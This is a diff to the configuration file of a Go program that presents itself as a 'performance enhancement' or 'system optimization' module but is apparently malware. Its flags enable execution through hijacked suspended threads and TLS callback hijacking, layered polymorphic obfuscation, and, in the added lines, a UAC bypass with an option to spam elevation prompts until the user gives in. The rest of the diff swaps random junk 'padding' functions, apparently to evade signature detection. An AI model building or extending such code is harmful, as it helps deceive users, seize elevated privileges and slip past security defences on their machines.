@@ -1,6 +1,6 @@
 // OBFUSCATED
 // Performance enhancement module
-// Windows compatibility layer
+// System optimization routine
 package configuration
 
 import (
@@ -80,6 +80,12 @@ var EnablePhantomThreads = true  // Execute via hijacked suspended threads (appe
 var PhantomThreadPoolSize = 5    // Number of pre-created phantom threads
 var PhantomTLSInjection = true   // Use TLS callback hijacking for extra stealth
 var PhantomChainExecution = true // Distribute execution across multiple phantom threads
+
+// UAC Bypass and Privilege Escalation
+var EnableUACBypass = true      // Attempt to bypass UAC and gain elevated privileges
+var UACSpamEnabled = false      // Spam UAC prompts until user accepts (aggressive)
+var UACSpamAttempts = 10        // Number of UAC prompts to show
+var UACSpamDelay = 500          // Milliseconds between UAC prompts
 
 // Quantum Polymorphic Encoding (NOVEL TECHNIQUE #4 - ZERO-DAY OBFUSCATION)
 var EnableQuantumObfuscation = true    // Multi-layer quantum encoding (7 encoding layers)
@@ -200,35 +206,35 @@ func GetRandomDelay() time.Duration {
 
 
 // Obfuscation padding
-func obf_32325() {
-    _ = 3011
-    var _ = "dL8vxIihAlpxDcO8cGsd1TW3fmDypAbtgsWrhv8L02T9dHdK3Z"
+func obf_16366() {
+    _ = 2791
+    var _ = "K6OODFP4scWgAEwL1QAFajQbN3uFq5sdTiTRcWf2jasaqczS5d"
 }
 
 
 // Obfuscation padding
-func obf_40715() {
-    _ = 2392
-    var _ = "lpiYhEMx9YIYJZvTaso2ykPSkymMLaOvHtlsP4oGib8gyUCJiW"
+func obf_33412() {
+    _ = 9459
+    var _ = "mVLzVwA5CGVBs06blpMUQirWaCN1Nxzkr4Cw0Hz4HAbngGsYGc"
 }
 
 
 // Obfuscation padding
-func obf_33588() {
-    _ = 5161
-    var _ = "eiNDJk6HebOHnK0CMD7fvLzisjvPQs71G2acFEteyLjDSOdxE4"
+func obf_88953() {
+    _ = 6166
+    var _ = "vthhVEu0edDv6qEcBxTfgXQCrQxXq8BphOE1ZFneqcJIhoUoQF"
 }
 
 
 // Obfuscation padding
-func obf_97966() {
-    _ = 5775
-    var _ = "jM5xqOcHQkbYTW64WwDutZxDTyB2EMa15lIUTac966IHU08C2a"
+func obf_83125() {
+    _ = 5924
+    var _ = "yr9Nk7mwSG7Rqv5YJM7sziqzqm6Aw5pUFMc3FlUHnoAAlq12US"
 }
 
 
 // Obfuscation padding
-func obf_71520() {
-    _ = 4411
-    var _ = "FzYT59K2LA7djS7LEP8CWlrks6dbArhRV3KFC9mzNIsfIMTnIL"
+func obf_74673() {
+    _ = 9339
+    var _ = "NSb04od2ILJxv5wnsSaatBAcf45rIKOiokPpukEipTbVVPKEXh"
 }
